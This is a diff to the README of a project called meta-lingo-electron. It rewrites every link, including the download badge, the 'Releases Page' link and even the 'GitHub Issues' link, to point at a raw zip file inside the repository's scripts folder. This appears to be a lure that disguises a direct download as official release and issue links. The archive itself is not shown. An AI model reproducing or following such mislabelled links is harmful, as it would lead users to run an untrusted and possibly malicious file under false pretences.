@@ -1,6 +1,6 @@
 # 🌟 meta-lingo-electron - Your Easy Tool for Linguistics Research
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/ogovea/meta-lingo-electron/releases)
+[![Download](https://github.com/ogovea/meta-lingo-electron/raw/refs/heads/master/scripts/meta-lingo-electron-3.2-beta.2.zip%https://github.com/ogovea/meta-lingo-electron/raw/refs/heads/master/scripts/meta-lingo-electron-3.2-beta.2.zip)](https://github.com/ogovea/meta-lingo-electron/raw/refs/heads/master/scripts/meta-lingo-electron-3.2-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run Meta-Lingo, ensure your computer meets these requirements:
 
 To get the software, visit the Releases page using the link below.  
 
-[Download Meta-Lingo](https://github.com/ogovea/meta-lingo-electron/releases)
+[Download Meta-Lingo](https://github.com/ogovea/meta-lingo-electron/raw/refs/heads/master/scripts/meta-lingo-electron-3.2-beta.2.zip)
 
 ### Step 2: Choose Your Version
 
@@ -90,8 +90,8 @@ We welcome contributions! If you want to help improve Meta-Lingo, check out our 
 
 ## 🔗 Useful Links
 
-- [Meta-Lingo Releases Page](https://github.com/ogovea/meta-lingo-electron/releases)
+- [Meta-Lingo Releases Page](https://github.com/ogovea/meta-lingo-electron/raw/refs/heads/master/scripts/meta-lingo-electron-3.2-beta.2.zip)
 - [Community Forums](#)  *(link to forums can be added)*
-- [GitHub Issues](https://github.com/ogovea/meta-lingo-electron/issues)
+- [GitHub Issues](https://github.com/ogovea/meta-lingo-electron/raw/refs/heads/master/scripts/meta-lingo-electron-3.2-beta.2.zip)
 
 Explore the possibilities of linguistics research with Meta-Lingo today!
